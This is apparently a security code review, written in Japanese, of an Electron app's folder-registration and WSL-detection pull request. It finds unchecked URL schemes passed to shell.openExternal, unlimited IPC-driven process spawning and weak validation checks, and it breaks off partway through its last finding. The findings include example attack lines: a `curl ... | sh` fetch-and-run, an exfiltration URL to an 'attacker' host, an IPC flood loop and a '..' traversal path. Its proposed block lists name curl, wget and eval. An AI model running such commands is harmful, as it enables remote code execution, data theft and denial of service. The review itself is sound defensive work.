# security-reviewer Review: フォルダ登録とランタイム検出 (R-1)

**Run**: 2026-09-16
**Reviewer**: security-reviewer
**Spec**: specs/001-runtime-folder-registration-runtime-detection/spec.md
**Round**: 1 (pr-gate)

> **本ファイルの保存経緯**: 本 subagent に `Write` tool が渡されていないため、
> reviewer の最終報告を pr-gate が保存したものである。

## 初回読了 viewpoint

**FR/SC (本 PR で実装・影響され、かつ A/B の owner 範囲に触るもの)**

- FR-005 / FR-024: probe 出力とマウント情報の解釈 (`wsl-output.ts` / `wsl-detector.ts`)
- FR-007 / FR-010 / FR-015: 停止中ディストロへの発行禁止・確認回数の境界強制・UNC 列挙 (`verified-running.ts` / `wsl-fs.ts` / `folder-service.ts`)
- FR-016 / FR-019: 重複判定キーと永続化レコードの復元検証 (`folder.ts` / `folder-record.ts` / `folder-store.ts`)
- FR-021 / FR-025 / FR-026: 3 名前空間の分離とパス API 独占 (`path-types.ts` / `path-api.ts` / `path-mapping.ts`)
- FR-037 (f) / FR-041: ディストロ内スクリプトの内容検査・プロセス起動の許可リスト (`probe-script.ts` / `wsl-cli.ts` / `scripts/constitution/*`)
- FR-038 / FR-039: `electron` import 限定・単一 capability・送信元検証 (`preload/index.ts` / `ipc.ts` / `validate.ts` / `origins.ts`)
- FR-040: カスタムプロトコル配信・ハンドラ封じ込め・CSP directive・`window.open` と外部遷移の拒否 (`protocol.ts` / `window.ts`)
- SC-001 / SC-005 / SC-013 / SC-016 / SC-018: 変換不能ケース / 起動発行 0 件 / 復元 / CSP・ナビゲーション / 検証表の各行

**touched files に該当する charter / Confirmation**

- `docs/domains/runtime/charter.md` — WSL 検出 KPI (SC-002)、パス API の業務ルール
- `docs/domains/ui/charter.md:41-47` — 「配信プロトコル・CSP 基線・検証項目 10 は R-1 が `app` レイヤで固定した。超える指定は nonce/hash か ADR」→ `protocol.ts` / `check.mjs` 項目 10 が該当
- AD-023 (accepted) — Electron セキュリティ要件 6 項目を全面採用、`setWindowOpenHandler` は scaffold 由来の checklist 項目として維持
- AD-025 (accepted) §7 — 緩和は CSP 組み立て 1 関数の dev 分岐のみ、ゲートは `app.isPackaged`
- AD-015 (accepted) §4 / §5 / §6 / §8 — UTF-8 要求、引数バックスラッシュ消失、マウントオプション正本、実地判定

**viewpoint 網羅性**

- A. 認可 / 認証 / RLS / secret: Critical:0 High:1 Medium:1 Low:1
- B. 入力検証 / injection / XSS / CSRF / 暗号: Critical:0 High:1 Medium:3 Low:3
- C. 業務不変条件 / Charter drift: 該当なし: `architecture-reviewer` の Owner
- D. Constitution / ADR drift: 該当なし: `architecture-reviewer` の Owner (FR-040 / FR-010 との差分は A/B の各指摘の**根拠**として引用し、drift としては二重計上しない)
- E. User Story / SC / AC / UX: 該当なし: `po-reviewer` の Owner
- F. 命名 / module 配置 / lint hookup: 該当なし: `convention-reviewer` の Owner
- G. DB / API / a11y / perf / OpenAPI / UX state: 該当なし: migration / `.sql` / OpenAPI が 0 件。a11y / ux は code-gate で実施済み
- H. テスト / coverage / observability / regression: 該当なし: 検証経路の不備は A / B 各指摘の推奨アクションに内包した (design-gate round と同じ扱い。単独計上すると同一事象の二重計上になる)

## スコープ要約

R-1 は実コードが揃った最初の PR であり、攻撃面は設計時と同じ 3 つ — (1) renderer → main の IPC、(2) 未信頼文字列 (ディストロ名 / renderer 供給パス / 永続化ファイル / `/proc/mounts`) から `wsl.exe` 引数と UNC パスへの経路、(3) カスタムプロトコル + CSP + ナビゲーション制御による renderer の閉じ込め。**design-gate で出した 10 件はすべて実装で解消されている** (下表)。特に (2) は `makeRuntimePath` / `isValidPathDTO` / `toUnc` の 3 重でバックスラッシュと `.`/`..` を落とし、`toUnc` が合成後に再正規化して share 配下への封じ込めを検証しており、設計時の C-001 は構造的に閉じた。秘密情報は repo 内に 0 件 (`sk_` / `AIza` / `ghp_` / private key / 生 credential すべて 0 件)、`electron-builder.yml:10` が `.env` を配布物から外し、`electron.vite.config.ts` に renderer bundle へ env を焼く `define` は無い。

残った指摘は攻撃面 (3) と「境界での資源制約」に集中する。最も重いのは **`window.open` / 外部遷移を「拒否」と書いた FR-040 に対し、実装が任意 scheme を `shell.openExternal` で OS に転送している**点で、検証項目 11 が存在確認しか見ていないため機械検証は緑のまま通る。次に、FR-010 が「境界で強制する制約」と明記した同時実行の束ね (single-flight) が実装のどこにも無く、renderer 由来の IPC が `wsl.exe` のプロセス起動とセッション Map を無制限に増やせる。いずれも renderer 内のスクリプト実行を前提とするため、`reviewer-base.md` の禁則に従い **High 上限**とした (Critical は 0 件)。

**重複抑制の遵守**: code-gate iteration 1 の MF-003 (`ipc.ts:122-127` の `event.sender.id` 束縛) / MF-004 (`index.html` 静的 CSP 撤去 → `protocol.ts:173` / `window.ts:76`) は解消済みとして扱い、再指摘していない。`window.ts` に対する本 round の指摘 (H-001) は同ファイルだが **origin が異なる** (MF-004 は CSP 宣言箇所の移設、H-001 は `openExternal` の scheme 検証欠落) ため新規として起票する。

## design-gate 指摘 10 件の解消状況 (必須判定)

| design ID | 内容 | 判定 | 根拠 (file:line) |
|---|---|---|---|
| C-001 | POSIX 値中のバックスラッシュが UNC 合成でセグメント境界になる | **解消** | `path-types.ts:113` が `\` を `forbidden-character` で拒否 / `:117` が `.`/`..` を拒否 / `validate.ts:72` が IPC 境界で同じ拒否 / `path-api.ts:150-154` が合成後に `win32.normalize` して share 配下を検証し `outside-share` を返す / `path-api.ts:48-57` `isValidSegment` が `/`・`\`・`.`・`..`・制御文字を拒否 / `folder-record.ts:130` が復元でも同じ生成関数を通す / spec SC-001 に「バックスラッシュを含む POSIX 値で変換不能」を追加済み。**残余は host 名前空間側のみ** → 新規 M-004 |
| C-002 | AD-023 が必須とする送信元検証が FR にも検証表にも無い | **解消** | FR-039 に送信元検証・origin 集合の単一化・環境で無効化する分岐の禁止を明記 / `validate.ts:46-51` `isTrustedSender` (frame null 拒否・`frame.parent !== null` 拒否・`allowedOrigins()` 照合) / `ipc.ts:74-82` が**全チャンネル共通の前置き**として適用 / トークンの送信元束縛 `folder-service.ts:61,246,271-274` / 検証 `validate.test.ts:76-94`、`folder-service.test.ts:182-194` |
| H-001 | `beginBrowse({kind:'windows'})` が検証不要とされ拒否手段も無い | **解消** | `validate.ts:125` が `kind === 'windows'` を `unsupported-location` で**常に拒否** / `folder-service.ts:238` に二重の拒否 / `BrowseError` に `unsupported-location` が追加 / FR-015 に「所在 `windows` に対してこの入口を開いてはならない」 / SC-018 に該当行 / `folder-service.test.ts:232-235` |
| H-002 | プロトコルハンドラの配信範囲に要求が無い | **解消** | FR-040 に「正規化後も同梱 renderer 出力ディレクトリ配下に収まる要求だけを解決」を明記 / `protocol.ts:112-144` が 3 段 (`new URL` 正規化 → `decodeURIComponent` 後のセグメント検証 → `isValidHostSegment` が `:` を拒否) + `:140-141` の接頭辞再確認 / `protocol.test.ts` 存在 / SC-016 にハンドラ単体テストの計測経路 |
| H-003 | CSP directive が規定されず `unsafe-inline`/`unsafe-eval` でも要件を満たす | **解消** | FR-040 が directive 集合を明記 / `protocol.ts:35-63` が `default-src 'none'` + `object-src`/`frame-ancestors`/`base-uri`/`form-action` を封じる / `unsafe-eval` は両環境で不在、`unsafe-inline` は dev 分岐のみ / ゲートは `origins.ts:27-29` `app.isPackaged` / `check.mjs:396-481` 項目 10 が (a) 必須 directive (b) 禁止形 (c) `unsafe-inline` の位置 (d) ゲート式 (e) **他ファイルに 2 つ目の宣言が無いこと**を検査 / `index.html:11-22` から meta CSP 撤去 (= MF-004) |
| H-004 | 「3 不変条件は SH-014 項目 6 が検査する」が research と矛盾 (誤った安心) | **解消 (残余あり)** | `probe-script.ts:4` が「**ADR レビューが担保する。機械検証されない**」に訂正 / `check.mjs:325` の note も同じ / 項目 6 は 3 点検査に分解済み (`check.mjs:262-318`: (i) 単一リテラル (ii) 標準入力へ書く式が識別子そのもの — **全ファイル走査** (iii) 許可形) / `allowlists.mjs:222-229` の文言も一致。**(iii) の実装が行内部分一致である点が残余** → 新規 M-002 |
| H-005 | `distroName` に文字種制約が無い | **解消** | `namespace.ts:35-45` `isValidDistroName` (長さ・先頭 `-`・`\`・`/`・`:`・NUL/C0/DEL/C1) / `wsl-detector.ts:104-107` が**列挙時点**で検証し不正名を `invalid-name-charset` として黙って落とさない / `:159` `verifyRunning` も再検証 / `wsl-cli.ts:57-63` `assertNoBackslash` が二重の網 / `validate.ts:87`・`folder-record.ts:55`・`path-types.ts:108,131` が全境界で同じ関数 / SC-002 に「文字種制約を満たさない名前は列挙不能として提示」 |
| M-001 | `displayName` / `id` / `registeredAt` に検証規則が無い | **解消** | `folder-record.ts:77-90` が `isValidFolderId` / 長さ上限 / 制御文字 / `Number.isFinite` を検査 / `folder-store.ts:138-143` が `isUniqueId` で `id` 一意性を要求し `invalid-record` に計上 / `validate.ts:165-172` `isValidDisplayName` / 上限と述語は `domain/validation.ts` の 1 箇所 |
| M-002 | 「読み取りのみ」が判定 4 と矛盾 | **解消** | `probe-script.ts:5-7` が「永続的な変更 (ファイル・パッケージ・OS 設定) を残さない。プロセス寿命で消える一時資源の生成 — user namespace の試験生成 — は許す」に書き換え / `allowlists.mjs:222-229` も同文 |
| L-001 | `registerFolder` の `location` に実在性照合が無い | **解消** | `validate.ts:207-210` が `kind === 'wsl'` のとき検出済み descriptor との一致を要求し `unknown-location` を返す |

**resolved: 10 / unresolved: 0**。うち 2 件 (C-001 / H-004) に別 origin の残余があり、新規指摘として再起票した (M-004 / M-002)。

## Findings

### [High] `shell.openExternal` に scheme の許可リストが無く、FR-040 の「拒否」が「OS への転送」になっている (H-001) (scope: feature)

- **観察**: `src/main/app/window.ts:47-50`

  ```ts
  window.webContents.setWindowOpenHandler(({ url }) => {
    void shell.openExternal(url)
    return { action: 'deny' }
  })
  ```

  同ファイル `:53-66` の `will-navigate` も、許可 origin 外のすべてに対して `event.preventDefault()` の直後に `void shell.openExternal(url)` を呼ぶ。**どちらにも scheme の検査が無い**。FR-040 は「**`window.open` と外部 URL へのトップレベル遷移を拒否しなければならない**」と書いており、SC-016 の計測経路は「ナビゲーション拒否は**検証スクリプトの項目**」である。その項目 (`scripts/constitution/check.mjs:502-510`) は `setWindowOpenHandler(` と `.on('will-navigate'` の**呼び出しが存在すること**しか見ない。ハンドラの中身が `deny` かどうか、転送先 scheme を絞っているかは一切見ない。
- **同種事象探索**: `openExternal|setPermissionRequestHandler|setPermissionCheckHandler` をリポジトリ全体で grep → `src/` 内 **2 件** (`window.ts:48` / `window.ts:64`、いずれも scheme 無検査)。scheme 許可リストを定義した箇所 **0 件** (`allowlists.mjs` にも `openExternal` の項目は 0 件)。`openExternal` / `will-navigate` / `setWindowOpenHandler` の**挙動**を検証するテスト **0 件** (`*.test.ts*` 全走査で該当 0。`validate.test.ts` が検証しているのは `isTrustedSender` のみ)。
- **リスク/影響**: `shell.openExternal` は Windows では `ShellExecute` 相当であり、渡された scheme を OS のハンドラに解決させる。`file:///C:/...exe` / `smb://host/share/x.exe` / 任意の登録済みカスタムプロトコルを渡せば、**`sandbox: true` の renderer から sandbox の外でプログラムを起動できる** (CWE-749 / Electron セキュリティチェックリスト「Do not use `shell.openExternal` with untrusted content」)。加えて `connect-src 'none'` で閉じたはずの外部通信経路が `openExternal('https://attacker/?d=...')` で復活し、**CSP による exfiltration 封鎖を素通りする**。現時点で renderer にスクリプト実行を取る経路は観察されていない (packaged CSP は `script-src 'self'`、React のエスケープが効いており、`markdown-text.tsx:150` の `a` は react-markdown の既定 URL 変換が `file:` を落とす、`ChatScreen.tsx:34` の messages は空配列) ため、**cascade 上の実害成立には renderer 側の別の破れを 1 つ要する**。よって `reviewer-base.md` §禁則に従い Critical にはしない。ただし構図は design-gate H-003 と同型である — **要求を満たしたまま防御効果を 0 にでき、機械検証が緑を返し続ける**。R-1 は「以降の全 feature が乗る土台」であり、R-3 が transcript (モデル出力・外部由来テキスト) を描画するとリンクは直ちに攻撃者制御下に入る。
- **推奨アクション**:
  1. `origins.ts` に `EXTERNAL_URL_SCHEMES = ['https:', 'http:']` を新設し (集約先を origin 定数と同じファイルに置く)、`window.ts:47-50` / `:64` の両方で `new URL(url).protocol` が集合に含まれるときだけ `openExternal` を呼ぶ。含まれない場合は**何もしない** (`action: 'deny'` / `preventDefault()` のみ)。URL の parse 失敗は拒否 (`:57-61` と同じ扱い)。
  2. `check.mjs` 項目 11 を存在確認から**内容検査**へ広げる — (a) `setWindowOpenHandler` のコールバックが `action: 'deny'` を返すこと、(b) `openExternal` の呼び出しが scheme 許可リスト定数の参照と同一行/同一ブロックにあること、(c) 許可リスト定数の定義が 1 箇所であること (`allowedOrigins` と同じ扱い)。
  3. `window.ts` にハンドラ単体テストを追加し、`file:` / `smb:` / 未知 scheme が `openExternal` に到達しないことを固定する。SC-016 の「ナビゲーション拒否」を検証スクリプト項目だけに委ねない。
- **根拠**: FR-040 (最終段)、SC-016、AD-023 「`setWindowOpenHandler` は assistant-ui の Electron セキュリティチェックリストの 1 項目」/ 「セキュリティ要件は全面的に採用する」、CWE-749 / CWE-939、OWASP / Electron Security Checklist #14
- **scope 根拠**: `window.ts` / `check.mjs` はいずれも本 PR の touched files (`touched_files` に `src/main/app/window.ts` / `scripts/constitution/check.mjs` あり)。修正は feature 内で完結する

### [High] renderer 由来の IPC が `wsl.exe` のプロセス起動とセッション Map を無制限に増やせる (single-flight が実装されていない) (H-002) (scope: feature)

- **観察**: FR-010 は「**これは境界で強制する制約であり、UI の作り方に委ねてはならない — 再検出・判定・ブラウズ開始は同時実行を 1 本に束ね、追加要求は既存結果へ合流させる**」と明記している。実装にその束ねが**どこにも無い**。
  - `src/main/app/ipc.ts:89` `refreshRuntimes` → `composition-root.ts:76-85` → `runtime-store.ts:124-130` `detect()` は無条件に `detector.list()` を呼び、`wsl-detector.ts:72-76` が `listNames` / `listRunning` / `listVerbose` を**毎回 3 プロセス**起動する。さらに同経路が `probeAll()` を投げ、`:143` の `verifyRunning` 1 回 + ディストロごとの `probe` (`:162`) が加わる。
  - `ipc.ts:91-101` `probeRuntime` → `runtime-store.ts:195,207` が**毎回** `verifyRunning` + `probe` を起動する (「毎回実行状態を取り直す」が設計意図なのでキャッシュは使えない)。
  - `folder-service.ts:241` `beginBrowse` は `detector.verifyRunning([namespace])` を**毎回**呼ぶ (`wsl-detector.ts:152` → `cli.listRunning()` → 1 プロセス)。`ensureVerified()` (`:120-124`) の TTL キャッシュは `beginBrowse` 経路には掛かっていない。
  - `folder-service.ts:98,246` `sessions: Map<string, BrowseSession>` は `beginBrowse` ごとに `set` されるだけで、**件数上限も期限切れの定期回収も無い**。削除は `browseDirectory` が同じトークンで叩かれたときだけ (`:287`/`:309`)。
- **同種事象探索**: `inflight|inFlight|single-flight|singleFlight|coalesc|dedupe` をリポジトリ全体で grep → `src/` 内 **0 件** (ヒットは `pnpm-lock.yaml` と `.claude/skills` の無関係な文字列のみ)。プロセス起動箇所は `wsl-cli.ts:84` の **1 件**で、そこへ到達する renderer 制御の IPC チャンネルは **4 件** (`refreshRuntimes` / `probeRuntime` / `beginBrowse` / `listFolders` (TTL 経由))。呼び出し回数を制限する行 (rate limit / 同時実行上限 / in-flight 共有) **0 件**。`sessions` の上限・掃除 **0 件**。
- **リスク/影響**: 送信元検証を通った renderer が `for(;;) closta.refreshRuntimes()` を回すと、1 反復あたり最低 3 プロセス (判定を含めれば 4+N) の `wsl.exe` が起動し、各プロセスは最長 10〜20 秒生存する (`wsl-cli.ts:28,31`)。同時実行の上限が無いためプロセステーブルとメモリを食い潰し、**ホスト側のサービス停止に至る** (CWE-770 Allocation of Resources Without Limits)。`sessions` も同時に単調増加する (CWE-401 相当のメモリ枯渇)。これも renderer 内のスクリプト実行を前提とするため **High 上限**とするが、(a) 検証を通った正規の送信元からの要求であり追加の破れを要さない点、(b) FR-010 が「境界で強制する」と名指した制約が**実装に 1 行も無い**点で、H-001 より観察事実として明確である。副次的に、SC-004 の 300 ms / 4 秒予算も並行要求下では成立しない。
- **推奨アクション**:
  1. `runtime-store.ts` に in-flight promise を 1 本持たせ、`detect()` / `probeAll()` / `probeOne(id)` (id ごと) を single-flight にする。進行中の要求には同じ promise を返す (FR-010 の「追加要求は既存結果へ合流させる」の字義)。
  2. `folder-service.ts` の `beginBrowse` を名前空間ごとの in-flight で束ね、`ensureVerified()` の TTL キャッシュと確認経路を共有する。
  3. `sessions` に上限 (例: 送信元ごと 8 件、超過時は最古を破棄) と、`now()` 基準の期限切れ掃除を入れる。`BROWSE_SESSION_TTL_MS` は既にあるので判定材料は揃っている。
  4. `pickHostFolder` も同様に同時に 1 つだけ開くようにする (現状は呼ぶたびにネイティブダイアログを積める)。
  5. SC-018 の検証表テストに「同一チャンネルへの連続要求がプロセス起動を比例させないこと」を 1 ケース足す (`wsl-cli` はインタフェースなので spawn 回数を数えられる)。
- **根拠**: FR-010 (「境界で強制する制約」)、SC-004、CWE-770 / CWE-400、OWASP API4:2023 (Unrestricted Resource Consumption)
- **scope 根拠**: `runtime-store.ts` / `folder-service.ts` / `ipc.ts` はいずれも本 PR の touched files。FR-010 は本 spec の要求であり別 spec に送る余地が無い

### [Medium] `session` の permission ハンドラが未設定で、Electron の既定 (許可) のままになっている (M-001) (scope: feature)

- **観察**: `setPermissionRequestHandler` / `setPermissionCheckHandler` の呼び出しが `src/` に **0 件**。`window.ts:23-39` の `webPreferences` は `sandbox` / `contextIsolation` / `nodeIntegration` を明示しているが、`window.webContents.session` に対する permission 制御は無い (`:72` で `webRequest.onHeadersReceived` は使っている = session へのアクセス手段は既にある)。
- **同種事象探索**: `setPermissionRequestHandler|setPermissionCheckHandler` → **0 件** (H-001 と同じ grep で確認)。
- **リスク/影響**: Electron はハンドラ未設定時に権限要求を既定で許可する。renderer は `default-src 'none'` の CSP 下にあり外部コンテンツを読まないため現状の露出は小さいが、`display-capture` / `media` / `clipboard-read` が無条件に通る状態は AD-023 が「全面的に採用する」と宣言した assistant-ui / Electron セキュリティチェックリストの項目 (Handle session permission requests) が未実装であることを意味する。H-001 と同じく実害成立には renderer 側の破れを要するため Medium。
- **推奨アクション**: `window.ts` (または `app` の起動経路) で `session.setPermissionRequestHandler((_wc, _perm, callback) => callback(false))` と `setPermissionCheckHandler(() => false)` を置く。R-1 は権限を 1 つも要しないので全拒否が正しい既定であり、必要になった feature が許可集合を 1 定数として追加する形にする (`allowedOrigins` と同じ集約方針)。`check.mjs` 項目 11 に存在確認を追加する。
- **根拠**: AD-023 「同ガイドのセキュリティ要件は全面的に採用する」、FR-039、CWE-276 (Incorrect Default Permissions)、Electron Security Checklist #5
- **scope 根拠**: `window.ts` は本 PR の touched files

### [Medium] 項目 6 (iii) の許可形検査が行内の部分一致であり、許可形を 1 語含む行に任意のコマンドを連ねられる (M-002) (scope: feature)

- **観察**: `scripts/constitution/check.mjs:312-318`

  ```js
  for (const line of script.split('\n')) {
    const body = line.trim()
    if (body === '' || body.startsWith('#')) continue
    if (!DISTRO_SCRIPT_ALLOWED_FORMS.some((form) => body.includes(form))) { ... }
  }
  ```

  判定は `body.includes(form)` であり、**行全体が許可形に収まっていることを要求しない**。`allowlists.mjs:239-247` の許可形は `command -v` / `test -` / `unshare` / `cat /proc/` / `echo` / `printf` / `exit`、`:250` の禁止形は `>` / `>>` / `tee` / `dd ` / `install ` / `mkdir` / `touch` のみで、**`;` / `&&` / `||` 以降の連結、`|` によるパイプ、`` ` `` / `$(...)` のコマンド置換、`rm` / `mv` / `cp` / `ln` / `chmod` / `curl` / `wget` / `sh -c` / `eval` を禁じる行が 0 件**。例えば `printf 'bwrap=%s\n' "$x"; curl http://host/p | sh` は (i) 単一リテラル、(ii) 標準入力へ書く式が識別子そのもの、(iii) 各行が `printf` を含む、を**すべて満たす**。
- **同種事象探索**: `DISTRO_SCRIPT_ALLOWED_FORMS|DISTRO_SCRIPT_FORBIDDEN_FORMS` → 定義 1 件 (`allowlists.mjs:239,250`)、使用 1 件 (`check.mjs:307,315`)。行全体を錨付け (`^...$`) で照合する実装 **0 件**。`;`/`|`/`` ` ``/`$(` を禁止形に含める行 **0 件**。
- **リスク/影響**: design-gate H-004 の**誤った安心**の部分は解消済みであり (`probe-script.ts:4` と `check.mjs:325` が「機械検証されない。定数の変更には ADR を要する」と明記)、最終的な担保は人間の ADR レビューである。したがってこれは「唯一の防御が無効」ではなく、**3 点検査のうち (iii) が意図した強度に達していない**という残余である。現在の `PROBE_SCRIPT` (`probe-script.ts:38-47`) は許可形に正しく収まっており、違反は無い。
- **推奨アクション**: (iii) を「行全体が許可形の錨付きパターンに一致すること」に変える (例: `printf '<literal>' "$(command -v X || printf '')"` のような形を正規表現で列挙する)。あるいは最小の追加として `DISTRO_SCRIPT_FORBIDDEN_FORMS` に `;` / `&&` / `|` (`||` を除く必要があるため `| ` の形) / `` ` `` / `rm ` / `chmod` / `curl` / `wget` / `sh -c` / `eval` を加える。`probe-script.ts:20-25` が「リダイレクトを 1 つも使わない」理由として述べている論法 (「1 つでも許すと検証の意味が薄れる」) は連結・パイプにもそのまま当てはまる。
- **根拠**: Constitution Principle VI、FR-037 (f)、CWE-78 (検査の不完全性として)、design-gate H-004 の残余
- **scope 根拠**: `scripts/constitution/{check,allowlists}.mjs` は本 PR の touched files

### [Medium] CSP の dev ゲート検査が `process.env` のドット記法しか見ず、bracket 記法を見逃す (M-003) (scope: feature)

- **観察**: `scripts/constitution/check.mjs:449`

  ```js
  const envGate = /process\s*\.\s*env\s*\.\s*[A-Za-z0-9_]+/.exec(src.code)
  ```

  FR-040 は「緩和は CSP を組み立てる 1 関数の dev 分岐にのみ現れ、**ゲートは `app.isPackaged` とする** — 環境変数で判定すると出荷物でも環境変数 1 つで有効化できる」と要求し、項目 10 (d) がこれを検査する。しかし正規表現はドット記法限定で、**このリポジトリ自身が bracket 記法を使っている** — `src/main/app/origins.ts:34` / `:58` は `process.env['ELECTRON_RENDERER_URL']` である。同じ書き方を `protocol.ts` の dev 分岐に持ち込めば、検査は発火しない。
- **同種事象探索**: `process\s*\.\s*env|process\[` を `src/` で grep → **3 件** (`origins.ts:34`、`origins.ts:58`、`wsl-cli.ts:87`)。うち **2 件が bracket 記法**で、現行の検査パターンでは捕捉できない形である。等価経路 (bracket / 分割代入 / `Object.entries(process.env)` 等) を見る行 **0 件**。なお `allowlists.mjs:265-280` の Principle II 用パターンは bracket 記法と分割代入を**きちんと列挙している**ため、同一リポジトリ内で強度が揃っていない。
- **リスク/影響**: 現時点で `protocol.ts` は `process.env` を一切参照せず、実効ゲートは `origins.ts:27-29` の `!app.isPackaged` と env 変数の AND になっているため**違反は無い**。問題は検査の網であり、FR-036 が Principle II の検査に「識別子の直接参照だけでなく、等価な API と構文変形も対象とし」と課したのと同じ要求が FR-040 側の検査に反映されていない点。R-2 以降で dev 分岐を触る feature が bracket 記法を使えば静かに抜ける。
- **推奨アクション**: `allowlists.mjs` に `ENV_ACCESS_PATTERNS` を新設し、ドット記法・bracket 記法 (`process\s*\[\s*['"\`]env['"\`]\s*\]` も含む)・分割代入 (`{...env...} = process`) を列挙して項目 10 (d) と将来の項目から共用する。`PLATFORM_BRANCH_PATTERNS` と同じ書式に揃えれば、強度の差が構造的に生じない。
- **根拠**: FR-040 / FR-036 / SC-016、AD-025 §7、CWE-693 (Protection Mechanism Failure)
- **scope 根拠**: `scripts/constitution/{check,allowlists}.mjs` は本 PR の touched files

### [Medium] ホスト名前空間のパスに `.` / `..` の拒否も正規化も無く、`registerFolder` + `listFolders` が任意ホストパスの存在オラクルになる (M-004) (scope: feature)

- **観察**: `src/domain/runtime/path-types.ts:80-94` `makeHostPath` は長さ・制御文字・ドライブレター形式・末尾セパレータのみを扱い、**`.` / `..` セグメントを拒否も解決もしない** (同ファイル `:117` の `makeRuntimePath` は明示的に拒否している)。IPC 境界の `src/main/app/validate.ts:69` も `if (p.namespace === 'host') return true` で、ホスト値には長さと制御文字以外の制約が無い。したがって `registerFolder({ location:{kind:'windows'}, path:{namespace:'host', value:'C:\\Users\\x\\..\\..\\Windows\\System32\\config'}, displayName:'a' })` が受理され、`folder-service.ts:138` の `hostFs.exists(folder.path)` が `stat` を発行して結果が `reachability` として renderer に返る。
  spec `## Assumptions` は「所在 `windows` の登録パスは renderer の主張をそのまま受理する。**到達可能性の実在確認を登録済みエントリに限ることで、任意パスの存在を問い合わせる経路を作らない**」と書くが、登録自体に回数制限も由来の要求も無いため、**register → list を繰り返せば任意ホストパスの存在を列挙できる**。前段の主張が実装で成立していない。
  併せて `src/domain/workspace/folder.ts:100` `folderKey` が未正規化の `path.value` を鍵にするため、`C:\a\..\b` と `C:\b` は別エントリになる — FR-016 の「末尾セパレータの有無は正規化後に同一とみなす」と同じ論法が `..` には効いていない。
- **同種事象探索**: `makeHostPath` の呼び出し → **4 件** (`folder-service.ts:205` renderer draft / `folder-record.ts:120` 永続化復元 / `composition-root.ts:58` userData / `path-api.ts:116,180` 変換と join の内部)。このうち**未信頼入力を受けるのは 2 件** (`folder-service.ts:205` / `folder-record.ts:120`) で、いずれも `..` を拒否しない。ホスト値に対して `.`/`..` を拒否または正規化する行 **0 件** (`hostPathOps.join` (`path-api.ts:177`) は `isValidHostSegment` 経由で拒否するが、`makeHostPath` の生成経路は通らない)。**ランタイム名前空間側は 0 件の漏れ** (`path-types.ts:117`、`validate.ts:72`、`path-api.ts:48-57`、`path-api.ts:150-154` の 4 重)。
- **リスク/影響**: 露出はファイル存在の有無に限られ、renderer は絶対パスをそのまま登録することで同じ情報を得られる (= `..` が増やす情報は無い)。よってデータ漏洩としては小さく Medium。ただし (a) spec の Assumption が主張する不変条件が実装で成立していない、(b) `C:\a\..\b` 形の重複エントリが FR-016 を破る、(c) 3 名前空間のうちホストだけが `.`/`..` の不変条件を持たない非対称は C-001 が塞いだ構図の裏返しである、の 3 点で残すべき。
- **推奨アクション**: `makeHostPath` に「`.` / `..` セグメントを含まないこと (解決済みであること)」を `makeRuntimePath` と同じ形で追加する。`pickHostFolder` (`composition-root.ts:109`) と `app.getPath('userData')` (`:58`) はいずれも正規化済みの値なので影響しない。あわせて data-model §1 の `HostPath` 不変条件に同じ 1 行を書き、SC-001 のテストに「`..` を含むホスト値で生成不能」を足す。Assumption の文面も「登録は renderer の主張を受理するが、値は解決済みであることを要求する」に改める。
- **根拠**: CWE-22 / CWE-20 / CWE-204 (存在オラクル)、FR-016 / FR-021 / FR-027、spec `## Assumptions`、data-model §1
- **scope 根拠**: `path-types.ts` / `validate.ts` / `folder.ts` は本 PR の touched files

### [Low] プロトコルハンドラが要求 URL の host 成分を検査せず、同じアセットが任意の `closta://<host>/` で配信される (L-001) (scope: feature)

- **観察**: `src/main/app/protocol.ts:112-118` は `new URL(requestUrl).pathname` だけを使い、host 成分を捨てる。`registerAppProtocol` (`:161`) はスキーム全体に対してハンドラを張るため、`closta://evil/index.html` も 200 で配信される。
- **同種事象探索**: `request.url` / `new URL(requestUrl)` の使用 **1 件** (`protocol.ts:114`)。host を照合する行 **0 件**。`PACKAGED_ORIGIN` (`origins.ts:19`) との突き合わせ **0 件**。
- **リスク/影響**: 現状は無害である — `closta://evil` は `allowedOrigins()` (`origins.ts:49-54`) に含まれないので `isTrustedSender` が IPC を拒否し (`validate.ts:50`)、`frame-ancestors 'none'` と `default-src 'none'` が frame 化も封じ、`will-navigate` も遷移を止める。ただし「配信元 origin は 1 つ」という FR-039 の前提に対し、実際には同一コードを載せた別 origin が無数に作れる状態であり、origin を鍵にした防御 (送信元検証・`localStorage` 分離) の前提が緩い。
- **推奨アクション**: `resolveRequest` の冒頭で `new URL(requestUrl).host` が `PACKAGED_ORIGIN` の host と一致することを検査し、不一致は `null` (= 403) を返す。`protocol.test.ts` にケースを 1 つ足す。
- **根拠**: FR-039 (「許可する origin の集合は 1 つの定数に集約」)、CWE-346 (Origin Validation Error)
- **scope 根拠**: `protocol.ts` は本 PR の touched files

### [Low] `wsl.exe` 子プロセスに親環境を丸ごと渡している (L-002) (scope: feature)

- **観察**: `src/main/infra/runtime/wsl-cli.ts:87` — `env: { ...process.env, WSL_UTF8: '1' }`。
- **同種事象探索**: `spawn` の呼び出し **1 件** (`wsl-cli.ts:84`)。`env` を最小集合で組む実装 **0 件**。
- **リスク/影響**: WSL は既定では Windows 側環境変数をディストロ内へ共有しないが、利用者の `WSLENV` 設定次第で共有対象が広がる。Principle V / FR-019 が「秘密情報のフィールドを持たない」と定めた対象は永続化スキーマであり環境変数は射程外だが、将来 `provider` (X-3) が API キーをプロセス環境に載せる設計を採ると、この 1 行が自動的に共有経路になる。R-1 時点で秘密は存在しないため Low。
- **推奨アクション**: `env` を `{ WSL_UTF8: '1', SystemRoot: process.env.SystemRoot, ... }` のように**必要な変数の明示列挙**に変える (Windows では `SystemRoot` / `PATH` / `USERPROFILE` 程度で足りる)。渡す変数の集合を設計で決められる形にしておく。
- **根拠**: Constitution Principle V、CWE-214 (Invocation of Process Using Visible Sensitive Information)
- **scope 根拠**: `wsl-cli.ts` は本 PR の touched files

### [Low] `build/entitlements.mac.plist` が dyld 環境変数と未署名実行メモリを許可している (L-003) (scope: out-of-scope)

- **観察**: `build/entitlements.mac.plist:5-10` が `com.apple.security.cs.allow-jit` / `allow-unsigned-executable-memory` / `allow-dyld-environment-variables` を `true` にしている。`electron-builder.yml:31-38` が `entitlementsInherit` で参照する。
- **同種事象探索**: entitlements ファイル **1 件**。`hardenedRuntime` / `notarize: false` (`electron-builder.yml:38`)。
